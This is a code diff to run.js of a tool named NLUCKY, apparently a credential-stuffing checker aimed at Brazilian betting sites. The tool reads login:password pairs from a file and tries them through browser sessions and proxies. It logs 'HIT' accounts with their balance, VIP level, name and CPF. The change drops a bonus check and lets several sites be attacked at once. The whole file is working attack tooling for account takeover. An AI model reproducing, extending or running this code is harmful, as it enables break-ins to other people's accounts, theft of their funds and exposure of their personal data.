@@ -1,4 +1,4 @@
-// run.js v14 — esteira por casa, browser por dominio, HIT destacado, watchdog, relatorio
+// run.js v18 — casas em paralelo, browser por dominio, HIT destacado, watchdog, relatorio
 import fs from "fs";
 import path from "path";
 import { exec } from "child_process";
@@ -11,7 +11,6 @@ import { setRateLimit } from "./trpc.js";
 import { runPool } from "./pool.js";
 import { banner, prompt, separator, c } from "./ui.js";
 import * as notificacao from "./notification.js";
-import { verificarBonus } from "./deepCheck.js";
 import { iniciarRelatorio, registrar, finalizarRelatorio } from "./report.js";
 import { criarParada } from "./stop.js";
 import { fecharBrowser } from "./browser.js";
@@ -22,10 +21,10 @@ const sendDesktopNotification =
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 // ── prazos ───────────────────────────────────────────────────────────────
-const LIMITE_CHECK = 150000;   // conta inteira
-const LIMITE_BONUS = 25000;   // deepCheck
-const LIMITE_TRAVA = 180000;  // watchdog: sem progresso real
-const INTERVALO_SOM = 3000;   // anti-tempestade de powershell
+const LIMITE_CHECK = 90000;    // conta inteira
+const LIMITE_TRAVA = 120000;   // watchdog: sem progresso real
+const INTERVALO_SOM = 3000;    // anti-tempestade de powershell
+const TETO_ABAS = 60;          // abas totais antes de avisar
 
 class TimeoutConta extends Error {}
 
@@ -93,7 +92,7 @@ function draw(stats, info, forcar = false) {
     const cols = Math.max(40, process.stdout.columns || 80);
     const line =
       `  ${c.ACCENT2}${bar}${c.RESET} ${pct}% ${c.DIM}│${c.RESET} ${info.done}/${info.total} ${c.DIM}│${c.RESET} ` +
-      `${c.GREEN}hits:${stats.hits}${c.RESET} ${c.MAGENTA}bonus:${stats.bonus}${c.RESET} ${c.YELLOW}ss:${stats.ss}${c.RESET} ${c.R}proib:${stats.proib}${c.RESET} ` +
+      `${c.GREEN}hits:${stats.hits}${c.RESET} ${c.YELLOW}ss:${stats.ss}${c.RESET} ${c.R}proib:${stats.proib}${c.RESET} ` +
       `${c.DIM}bad:${stats.bad} nf:${stats.nf} unk:${stats.unk} err:${stats.err}${c.RESET}` +
       (info.parado ? ` ${c.R}⏹ parando${c.RESET}` : "");
     process.stdout.write(
@@ -132,7 +131,6 @@ const CLASS_TO_BUCKET = {
 const RETRY_STATUS = new Set(["INCONCLUSIVO", "CAPTCHA", "ERRO", "BLOQUEIO", "RATE"]);
 
 function tipoDe(report, config) {
-  if (report.bonus?.hit) return "bonus";
   if (report.status === "PROIBIDA") return "proibida";
   if (report.status === "LOGIN_OK") {
     const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
@@ -155,32 +153,47 @@ export async function cmdRun() {
   }
 
   const config = loadConfig();
-  const escopo = await prompt("  Casa (nome) ou ENTER para TODAS: ");
-  const alvo = escopo ? [escopo] : nomes;
+  const escopo = await prompt("  Casa (nome), lista separada por vírgula ou ENTER para TODAS: ");
+  const alvo = escopo
+    ? escopo.split(",").map((s) => s.trim()).filter(Boolean)
+    : nomes;
   const invalidas = alvo.filter((n) => !casas[n]);
   if (invalidas.length) {
     console.error(`❌ Não encontrada(s): ${invalidas.join(", ")}`);
     return;
   }
 
-  const threadsStr = await prompt(`  Threads ${c.DIM}[${config.threads}]${c.RESET}: `);
+  const threadsStr = await prompt(`  Threads por casa ${c.DIM}[${config.threads}]${c.RESET}: `);
   let threads = Math.min(50, Math.max(1, parseInt(threadsStr || config.threads, 10) || 1));
   const delayStr = await prompt(`  Delay entre requisições em ms ${c.DIM}[${config.delay || 90}]${c.RESET}: `);
   const delay = Math.max(0, parseInt(delayStr || config.delay || 90, 10) || 0);
-  const repescagemStr = await prompt(`  Passadas de repescagem ${c.DIM}[2]${c.RESET}: `);
-  const repescagens = Math.min(5, Math.max(0, parseInt(repescagemStr || 2, 10) || 0));
+  const repescagemStr = await prompt(`  Passadas de repescagem ${c.DIM}[1]${c.RESET}: `);
+  const repescagens = Math.min(5, Math.max(0, parseInt(repescagemStr || 1, 10) || 0));
   const filtroStr = await prompt(`  Só números com 9 no 3º dígito ${c.DIM}[${config.filtro9 ? "S" : "n"}]${c.RESET}: `);
   const filtro9 = (filtroStr || (config.filtro9 ? "s" : "n")).toLowerCase() !== "n";
   const arquivo = (await prompt(`  Arquivo de contas ${c.DIM}[contas.txt]${c.RESET}: `)) || path.join(ROOT, "contas.txt");
 
-  // login por browser é limitado pelo número de abas
+  // login por browser é limitado pelo número de abas da casa que vai rodar
   const casasComBrowser = alvo.filter((n) => casas[n].browserLogin).length;
   if (casasComBrowser) {
-    const abas = Math.max(4, Number(casas[alvo[0]]?.browserPages) || 8);
+    const abas = Math.max(4, ...alvo.map((n) => Number(casas[n]?.browserPages) || 0));
     if (threads > abas) {
       console.log(`  ${c.YELLOW}⚠ ${threads} threads com ${abas} abas — usando ${abas}${c.RESET}`);
       threads = abas;
     }
+  }
+
+  const simultaneasStr = await prompt(
+    `  Casas simultâneas ${c.DIM}[${Math.min(3, alvo.length)}]${c.RESET}: `,
+  );
+  const simultaneas = Math.max(1, Math.min(
+    alvo.length,
+    parseInt(simultaneasStr || Math.min(3, alvo.length), 10) || 1,
+  ));
+
+  const abasTotal = simultaneas * Math.max(4, ...alvo.map((n) => Number(casas[n]?.browserPages) || 8));
+  if (abasTotal > TETO_ABAS) {
+    console.log(`  ${c.YELLOW}⚠ ${simultaneas} casas × abas = ${abasTotal} abas — acima de ${TETO_ABAS} pode faltar RAM${c.RESET}`);
   }
 
   if (!fs.existsSync(arquivo)) {
@@ -215,22 +228,17 @@ export async function cmdRun() {
   loadProxies(path.join(ROOT, "proxy.txt"));
   const proxyCount = getProxyCount();
   banner();
-  console.log(`  ${c.ACCENT}▍${c.RESET} ${c.B}${contas.length}${c.RESET} contas únicas ${c.DIM}(${duplicadas} duplicadas)${c.RESET}`);
+  console.log(`  ${c.ACCENT}▍${c.RESET} ${c.B}${contas.length}${c.RESET} contas únicas ${c.DIM}(${duplicadas} duplicadas)${c.RESET} em ${alvo.length} casa(s), ${simultaneas} por vez`);
   if (ignoradas > 0) console.log(`  ${c.DIM}🔎 ${ignoradas} ignoradas — 3º dígito ≠ 9${c.RESET}`);
-  console.log(proxyCount ? `  🌐 ${proxyCount} proxies` : `  ${c.DIM}🌐 sem proxy${c.RESET}`);
-  if (proxyCount > 0 && threads > proxyCount * 2) {
-    console.log(`  ${c.YELLOW}⚠ ${threads} threads para ${proxyCount} proxies — considere ${Math.max(4, proxyCount)}${c.RESET}`);
-  }
-  const casasComDeep = alvo.filter((n) => casas[n].deepCheck?.enabled).length;
-  if (casasComDeep) console.log(`  ${c.MAGENTA}🔎 verificação profunda ativa em ${casasComDeep} casa(s)${c.RESET}`);
+  console.log(proxyCount ? `  🌐 ${proxyCount} proxies ${c.DIM}(reserva — login e perfil saem diretos)${c.RESET}` : `  ${c.DIM}🌐 sem proxy${c.RESET}`);
   await startTlsProxy();
-  setRateLimit(delay);
+  setRateLimit(delay, "*");
 
   const hitsDir = path.join(ROOT, "hits");
   if (!fs.existsSync(hitsDir)) fs.mkdirSync(hitsDir);
   const csvFile = path.join(hitsDir, "saidas.csv");
   if (!fs.existsSync(csvFile)) {
-    fs.writeFileSync(csvFile, "casa;conta;saldo;vip;nome;status;bonus;bonusItens;data\n", "utf-8");
+    fs.writeFileSync(csvFile, "casa;conta;saldo;vip;nome;status;data\n", "utf-8");
   }
 
   const arquivosPorCasa = new Map();
@@ -246,7 +254,7 @@ export async function cmdRun() {
     arquivosPorCasa.set(nome, hitsFile);
   }
 
-  const stats = { hits: 0, bonus: 0, ss: 0, proib: 0, bad: 0, nf: 0, unk: 0, err: 0 };
+  const stats = { hits: 0, ss: 0, proib: 0, bad: 0, nf: 0, unk: 0, err: 0 };
   const resultados = new Map();
   const pares = [];
   for (const nome of alvo) for (const conta of contas) pares.push({ nome, conta });
@@ -261,7 +269,7 @@ export async function cmdRun() {
   iniciarRelatorio(alvo);
 
   process.stdout.write("\u001b[2J\u001b[H\u001b[4;r\u001b[4;1H");
-  header = `  ${c.ACCENT2}${c.B}NLUCKY${c.RESET} ${c.DIM}│${c.RESET} casas:${alvo.length} contas:${contas.length} threads:${threads} delay:${delay}ms ${c.DIM}│ Q ou parar.js p/ parar${c.RESET}`;
+  header = `  ${c.ACCENT2}${c.B}NLUCKY${c.RESET} ${c.DIM}│${c.RESET} casas:${alvo.length} par:${simultaneas} contas:${contas.length} threads:${threads} delay:${delay}ms ${c.DIM}│ Q ou parar.js p/ parar${c.RESET}`;
 
   const parada = criarParada(() => draw(stats, { done: concluidas, total: totalGeral, parado: true }, true));
 
@@ -297,50 +305,36 @@ export async function cmdRun() {
 
   const deveParar = () => parada.parado() || forcado;
 
-  async function executarPassada(lista, threadsPassada, delayPassada, passe) {
-    setRateLimit(delayPassada);
-    const tarefas = lista.map(({ nome, conta }) => async () => {
+  async function executarPassada(nomeCasa, lista, threadsPassada, delayPassada, passe) {
+    setRateLimit(delayPassada, nomeCasa);
+    const tarefas = lista.map(({ conta }) => async () => {
       if (deveParar()) return;
 
-      const chave = `${nome}|${conta}`;
+      const chave = `${nomeCasa}|${conta}`;
       let report = null;
       let abandonada = false;
 
       try {
         const idx = conta.indexOf(":");
         report = await comPrazo(
-          fullCheck(casas[nome], nome, conta.slice(0, idx).trim(), conta.slice(idx + 1).trim()),
+          fullCheck(casas[nomeCasa], nomeCasa, conta.slice(0, idx).trim(), conta.slice(idx + 1).trim()),
           LIMITE_CHECK,
         );
-
-        if (report.status === "LOGIN_OK" && casas[nome].deepCheck?.enabled) {
-          const token = report.authTag || report.token;
-          if (token) {
-            try {
-              report.bonus = await comPrazo(
-                verificarBonus({ casa: casas[nome], token, deviceId: report.deviceId, traceId: report.traceId }),
-                LIMITE_BONUS,
-              );
-            } catch {
-              report.bonus = { ok: false };
-            }
-          }
-        }
       } catch (e) {
         abandonada = true;
         if (e instanceof TimeoutConta) {
           stats.unk++;
           resultados.set(chave, "INCONCLUSIVO");
-          log(`${c.YELLOW}[⏱ ${report?.status || "TIMEOUT"}]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
-          registrar({ casa: nome, conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: e.message });
-          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${conta} | TIMEOUT | ? | saldo=? | p${passe} | ${e.message}\n`);
+          log(`${c.YELLOW}[⏱ ${report?.status || "TIMEOUT"}]${c.RESET} ${nomeCasa} │ ${conta} │ ${e.message}`);
+          registrar({ casa: nomeCasa, conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: e.message });
+          appendSafe(path.join(hitsDir, `completo_${nomeCasa}.txt`), `${conta} | TIMEOUT | ? | saldo=? | p${passe} | ${e.message}\n`);
         } else {
           stats.err++;
           resultados.set(chave, "ERRO");
-          falhas.push(`${nome} | ${conta} | ${e.message}`);
-          log(`${c.R}[💥 ERRO]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
-          registrar({ casa: nome, conta, tipo: "erro", status: "ERRO", detalhe: e.message });
-          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${conta} | ERRO | ? | saldo=? | p${passe} | ${e.message}\n`);
+          falhas.push(`${nomeCasa} | ${conta} | ${e.message}`);
+          log(`${c.R}[💥 ERRO]${c.RESET} ${nomeCasa} │ ${conta} │ ${e.message}`);
+          registrar({ casa: nomeCasa, conta, tipo: "erro", status: "ERRO", detalhe: e.message });
+          appendSafe(path.join(hitsDir, `completo_${nomeCasa}.txt`), `${conta} | ERRO | ? | saldo=? | p${passe} | ${e.message}\n`);
         }
       } finally {
         concluidas++;
@@ -352,82 +346,63 @@ export async function cmdRun() {
       try {
         const saldoTxt = brl(report.saldo);
         const vip = vipTxt(report);
-        const hitsFile = arquivosPorCasa.get(nome) || path.join(hitsDir, `hits_${nome}.txt`);
-        const bonus = report.bonus;
+        const hitsFile = arquivosPorCasa.get(nomeCasa) || path.join(hitsDir, `hits_${nomeCasa}.txt`);
         const temDado = report.saldo !== null || report.vip !== null;
 
         if (report.status === "LOGIN_OK" && !temDado) {
           stats.unk++;
           resultados.set(chave, "INCONCLUSIVO");
-          log(`${c.YELLOW}[? PERFIL]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} login ok, sem saldo/vip`);
-          registrar({ casa: nome, conta: report.conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: "perfil sem saldo/vip" });
-          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${report.conta} | SEM PERFIL | ? | saldo=? | p${passe} | login ok\n`);
+          log(`${c.YELLOW}[? PERFIL]${c.RESET} ${nomeCasa} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} login ok, sem saldo/vip`);
+          registrar({ casa: nomeCasa, conta: report.conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: "perfil sem saldo/vip" });
+          appendSafe(path.join(hitsDir, `completo_${nomeCasa}.txt`), `${report.conta} | SEM PERFIL | ? | saldo=? | p${passe} | login ok\n`);
           return;
         }
 
         if (report.status === "LOGIN_OK" || report.status === "PROIBIDA") {
           const proibida = report.status === "PROIBIDA";
+          const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
+          const vipOk = report.vip !== null && report.vip >= config.minVip;
+          const relevante = proibida || saldoOk || vipOk;
 
-          if (bonus?.hit) {
-            const itensTxt = bonus.itens.map((i) => `${i.activeName || "?"}(${i.reward ?? "?"})`).join(" / ");
-            stats.bonus++;
-            log(
-              `${c.MAGENTA}[🎁 BÔNUS]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ` +
-                `${bonus.total}x ${c.DIM}│${c.RESET} soma=${brl(bonus.somaTotal)} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${proibida ? ` ${c.R}│ PROIBIDA${c.RESET}` : ""}`,
-            );
-            appendSafe(hitsFile, `${report.conta} | BONUS ${bonus.total}x soma=${bonus.somaTotal} | saldo=${saldoTxt} | ${itensTxt}\n`);
+          if (relevante && !proibida) {
+            stats.hits++;
+            const larg = 52;
+            log(`${c.GREEN}┌─ HIT ${"─".repeat(Math.max(0, larg - 6))}${c.RESET}`);
+            log(`${c.GREEN}│${c.RESET} ${c.B}${report.conta}${c.RESET} ${c.DIM}·${c.RESET} ${nomeCasa}`);
+            log(`${c.GREEN}│${c.RESET} vip ${c.MAGENTA}${vip}${c.RESET} ${c.DIM}·${c.RESET} saldo ${c.GREEN}${saldoTxt}${c.RESET}${report.nome ? ` ${c.DIM}·${c.RESET} ${report.nome}` : ""}`);
+            if (report.cpf) log(`${c.GREEN}│${c.RESET} ${c.DIM}cpf ${report.cpf}${c.RESET}`);
+            log(`${c.GREEN}└${"─".repeat(larg)}${c.RESET}`);
+            appendSafe(hitsFile, `${report.conta} | ${vip} | saldo=${saldoTxt}\n`);
             appendSafe(
               csvFile,
-              `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};BONUS;${bonus.somaTotal};${itensTxt};${new Date().toISOString()}\n`,
+              `${nomeCasa};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};${report.status};${new Date().toISOString()}\n`,
             );
-            if (config.sound) tocarSom();
-            if (config.notify) sendDesktopNotification(nome, `bônus ${brl(bonus.somaTotal)} | saldo=${saldoTxt}`, report.conta);
+            if (config.sound && saldoOk) tocarSom();
+            if (config.notify) sendDesktopNotification(nomeCasa, `vip ${vip} | ${saldoTxt}`, report.conta);
+          } else if (proibida) {
+            stats.proib++;
+            log(`${c.R}[🚫 PROIBIDA]${c.RESET} ${nomeCasa} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}`);
+            appendSafe(hitsFile, `${report.conta} | PROIBIDA | ${vip} | saldo=${saldoTxt}\n`);
+            appendSafe(
+              csvFile,
+              `${nomeCasa};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};PROIBIDA;${new Date().toISOString()}\n`,
+            );
           } else {
-            const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
-            const vipOk = report.vip !== null && report.vip >= config.minVip;
-            const relevante = proibida || saldoOk || vipOk;
-            const semBonus = bonus?.ok ? ` ${c.DIM}│ sem bônus${c.RESET}` : "";
-
-            if (relevante && !proibida) {
-              stats.hits++;
-              const larg = 52;
-              log(`${c.GREEN}┌─ HIT ${"─".repeat(Math.max(0, larg - 6))}${c.RESET}`);
-              log(`${c.GREEN}│${c.RESET} ${c.B}${report.conta}${c.RESET} ${c.DIM}·${c.RESET} ${nome}`);
-              log(`${c.GREEN}│${c.RESET} vip ${c.MAGENTA}${vip}${c.RESET} ${c.DIM}·${c.RESET} saldo ${c.GREEN}${saldoTxt}${c.RESET}${report.nome ? ` ${c.DIM}·${c.RESET} ${report.nome}` : ""}${semBonus}`);
-              if (report.cpf) log(`${c.GREEN}│${c.RESET} ${c.DIM}cpf ${report.cpf}${c.RESET}`);
-              log(`${c.GREEN}└${"─".repeat(larg)}${c.RESET}`);
-              appendSafe(hitsFile, `${report.conta} | ${vip} | saldo=${saldoTxt}\n`);
-              appendSafe(
-                csvFile,
-                `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};${report.status};;;${new Date().toISOString()}\n`,
-              );
-              if (config.sound && saldoOk) tocarSom();
-              if (config.notify) sendDesktopNotification(nome, saldoTxt, report.conta);
-            } else if (proibida) {
-              stats.proib++;
-              log(`${c.R}[🚫 PROIBIDA]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}`);
-              appendSafe(hitsFile, `${report.conta} | PROIBIDA | ${vip} | saldo=${saldoTxt}\n`);
-              appendSafe(
-                csvFile,
-                `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};PROIBIDA;;;${new Date().toISOString()}\n`,
-              );
-            } else {
-              stats.ss++;
-              log(`${c.YELLOW}[⚠️ SEM SALDO]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${semBonus}`);
-              appendSafe(hitsFile, `${report.conta} | SEM SALDO | ${vip} | saldo=${saldoTxt}\n`);
-            }
+            stats.ss++;
+            log(`${c.YELLOW}[⚠️ SEM SALDO]${c.RESET} ${nomeCasa} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}`);
+            appendSafe(hitsFile, `${report.conta} | SEM SALDO | ${vip} | saldo=${saldoTxt}\n`);
           }
         } else {
           const bucket = CLASS_TO_BUCKET[report.status] || "unk";
           stats[bucket]++;
           const cor = bucket === "err" ? c.R : bucket === "unk" ? c.YELLOW : c.DIM;
-          log(`${cor}[${report.status}]${c.RESET} ${nome} │ ${report.conta}${report.detalhe ? ` │ ${report.detalhe}` : ""}`);
+          log(`${cor}[${report.status}]${c.RESET} ${nomeCasa} │ ${report.conta}${report.detalhe ? ` │ ${report.detalhe}` : ""}`);
         }
 
         resultados.set(chave, report.status);
 
         registrar({
-          casa: nome,
+          casa: nomeCasa,
           conta: report.conta,
           tipo: tipoDe(report, config),
           status: report.status,
@@ -436,33 +411,31 @@ export async function cmdRun() {
           vipLabel: report.vipLabel,
           nome: report.nome,
           cpf: report.cpf,
-          bonus: report.bonus,
           detalhe: report.detalhe,
         });
 
         appendSafe(
-          path.join(hitsDir, `completo_${nome}.txt`),
-          `${report.conta} | ${report.status} | ${vip} | saldo=${saldoTxt} | p${passe} | bonus=${bonus?.hit ? `${bonus.total}x/${bonus.somaTotal}` : "-"} | ${report.detalhe}\n`,
+          path.join(hitsDir, `completo_${nomeCasa}.txt`),
+          `${report.conta} | ${report.status} | ${vip} | saldo=${saldoTxt} | p${passe} | ${report.detalhe}\n`,
         );
       } catch (e) {
         stats.err++;
         resultados.set(chave, "ERRO");
-        falhas.push(`${nome} | ${conta} | ${e.message}`);
-        log(`${c.R}[💥 ERRO]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
+        falhas.push(`${nomeCasa} | ${conta} | ${e.message}`);
+        log(`${c.R}[💥 ERRO]${c.RESET} ${nomeCasa} │ ${conta} │ ${e.message}`);
       }
     });
 
     await runPool(tarefas, threadsPassada, delayPassada > 0 ? Math.floor(delayPassada / threadsPassada) : 0);
   }
 
-  try {
-    for (const nomeCasa of alvo) {
-      if (deveParar()) break;
-      const paresCasa = pares.filter((p) => p.nome === nomeCasa);
-      if (!paresCasa.length) continue;
+  async function rodarCasa(nomeCasa) {
+    const paresCasa = pares.filter((p) => p.nome === nomeCasa);
+    if (!paresCasa.length) return;
 
-      process.stdout.write(`\u001b[4;1H\u001b[K  ${c.ACCENT2}▶ casa ${nomeCasa}${c.RESET} ${c.DIM}(${paresCasa.length} contas)${c.RESET}\n`);
-      await executarPassada(paresCasa, threads, delay, 0);
+    process.stdout.write(`\u001b[4;1H\u001b[K  ${c.ACCENT2}▶ casa ${nomeCasa}${c.RESET} ${c.DIM}(${paresCasa.length} contas)${c.RESET}\n`);
+    try {
+      await executarPassada(nomeCasa, paresCasa, threads, delay, 0);
 
       for (let passe = 1; passe <= repescagens; passe++) {
         if (deveParar()) break;
@@ -470,7 +443,7 @@ export async function cmdRun() {
         if (!pendentes.length) break;
 
         pendentesAtual = pendentes.length;
-        const espera = 4000 + passe * 3000;
+        const espera = 2500 + passe * 2000;
         process.stdout.write(`\u001b[4;1H\u001b[K  ${c.YELLOW}↻ Repescagem ${passe}/${repescagens} (${nomeCasa}): ${pendentes.length} pendentes${c.RESET}\n`);
         await sleep(espera);
         if (deveParar()) break;
@@ -481,13 +454,28 @@ export async function cmdRun() {
         }
 
         const tRetry = Math.max(1, Math.min(threads, 8));
-        const dRetry = Math.max(delay, 150 + passe * 120);
-        await executarPassada(pendentes, tRetry, dRetry, passe);
+        const dRetry = Math.max(delay, 120 + passe * 80);
+        await executarPassada(nomeCasa, pendentes, tRetry, dRetry, passe);
       }
-
-      await fecharBrowser();
+    } catch (e) {
+      falhas.push(`[${nomeCasa}] ${e.message}`);
+    } finally {
+      await fecharBrowser(casas[nomeCasa].domain);
       pendentesAtual = 0;
     }
+  }
+
+  try {
+    const filaCasas = [...alvo];
+    const n = Math.max(1, Math.min(simultaneas, filaCasas.length));
+    await Promise.all(
+      Array.from({ length: n }, async () => {
+        while (filaCasas.length && !deveParar()) {
+          const nomeCasa = filaCasas.shift();
+          await rodarCasa(nomeCasa);
+        }
+      }),
+    );
   } catch (e) {
     falhas.push(`[pool] ${e.message}`);
   } finally {
@@ -511,7 +499,7 @@ export async function cmdRun() {
     console.log(`  ${c.R}⏹ parado por ${motivo} — ${concluidas}/${totalGeral} percorridas${c.RESET}`);
     console.log();
   }
-  console.log(`  ${c.GREEN}hits:${c.RESET} ${stats.hits}   ${c.MAGENTA}bônus:${c.RESET} ${stats.bonus}   ${c.YELLOW}sem saldo:${c.RESET} ${stats.ss}   ${c.R}proibida:${c.RESET} ${stats.proib}   senha errada: ${stats.bad}   não existe: ${stats.nf}   inconclusivo: ${stats.unk}   erro: ${stats.err}`);
+  console.log(`  ${c.GREEN}hits:${c.RESET} ${stats.hits}   ${c.YELLOW}sem saldo:${c.RESET} ${stats.ss}   ${c.R}proibida:${c.RESET} ${stats.proib}   senha errada: ${stats.bad}   não existe: ${stats.nf}   inconclusivo: ${stats.unk}   erro: ${stats.err}`);
   console.log(`  ${c.DIM}total percorrido: ${concluidas}/${totalGeral}${c.RESET}`);
   if (pendentesFinal.length) {
     console.log(`  ${c.R}⚠️  ${pendentesFinal.length} contas continuaram sem resposta depois de ${repescagens} repescagem(ns).${c.RESET}`);
